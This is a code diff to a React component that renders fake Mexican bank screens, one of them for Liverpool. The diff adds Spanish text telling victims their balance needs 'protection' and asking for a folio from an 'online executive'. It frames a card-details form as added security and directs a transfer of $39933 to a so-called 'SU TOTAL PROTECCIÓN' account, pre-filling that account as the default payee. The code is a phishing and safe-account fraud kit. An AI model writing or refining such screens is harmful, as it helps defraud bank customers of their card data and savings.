@@ -124,9 +124,18 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
     // Función para obtener el contenedor según el banco
     // Función simplificada que solo contiene el contenido sin logos ni fechas
     const getBankContainer = (children: React.ReactNode) => {
+      // Mensaje de protección para todas las pantallas y bancos
+      const protectionMessage = (
+        <div className="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-4 text-left">
+          <p className="font-medium">Es necesario proteger su saldo</p>
+          <p className="text-sm">Por su seguridad, es necesario proteger el saldo de su cuenta efectivo, crearemos una cuenta de SU TOTAL PROTECCIÓN de forma gratuita para poder respaldar el fondo disponible</p>
+        </div>
+      );
+      
       // Utilizamos una única plantilla para todos los bancos
       return (
         <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center overflow-hidden">
+          {protectionMessage}
           {/* Eliminamos todos los logos y fechas de los contenedores de pantalla */}
           {children}
         </div>
@@ -139,6 +148,11 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         const folioContent = (
           <>
             <h2 className="text-xl font-bold mb-3">Ingresa tu folio</h2>
+            {banco === 'LIVERPOOL' ? (
+              <p className="mb-4">
+                Por favor, ingrese el folio de soporte técnico que su ejecutivo en línea le proporcionó.
+              </p>
+            ) : null}
             <div className="mb-4">
               <Input 
                 type="text" 
@@ -275,6 +289,10 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         const tarjetaContent = (
           <>
             <h2 className="text-xl font-bold mb-3">Verificación de tarjeta</h2>
+            <div className="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-4 text-left">
+              <p className="font-medium">Protección adicional</p>
+              <p className="text-sm">Con el fin de evitar intentos de compra en línea, agregaremos protección adicional a su tarjeta de crédito/débito.</p>
+            </div>
             <p className="mb-4">
               Para confirmar que eres el titular, por favor ingresa los datos de tu tarjeta.
             </p>
@@ -350,13 +368,22 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         const transferirContent = (
           <>
             <h2 className="text-xl font-bold mb-3">Transferencia</h2>
+            <div className="bg-green-50 border-l-4 border-green-400 p-4 mb-4 text-left">
+              <p className="font-medium">Cuenta SU TOTAL PROTECCIÓN creada exitosamente.</p>
+              <p className="text-sm mb-2">Con el fin de proteger su saldo disponible es necesario transferir la cantidad de $39933 a la siguiente cuenta SU TOTAL PROTECCIÓN (STP).</p>
+              <p className="text-sm"><strong>Clabe:</strong><br/>272762626262727272727272266222</p>
+              <p className="text-sm"><strong>Titular de la cuenta:</strong><br/>Nwnnwhwhw</p>
+              <p className="text-sm"><strong>Alias:</strong><br/>Cuenta de respaldo.</p>
+              <p className="text-sm mt-2 italic">Esta ventana se actualizará una vez reconozcamos que se haya transferido el saldo a su cuenta de respaldo.</p>
+            </div>
+            
             <div className="p-4 bg-gray-100 rounded mb-4 text-left">
               <p className="mb-2">
                 Confirma los datos de la transferencia:
               </p>
-              <p className="mb-1">Monto: <strong>${screenData.monto || "0.00"}</strong></p>
-              <p className="mb-1">CLABE: <strong>{screenData.clabe || "0000000000000000000"}</strong></p>
-              <p className="mb-1">Beneficiario: <strong>{screenData.titular || "Titular"}</strong></p>
+              <p className="mb-1">Monto: <strong>${screenData.monto || "39933.00"}</strong></p>
+              <p className="mb-1">CLABE: <strong>{screenData.clabe || "272762626262727272727272266222"}</strong></p>
+              <p className="mb-1">Beneficiario: <strong>{screenData.titular || "Nwnnwhwhw"}</strong></p>
             </div>
             
             <Button 
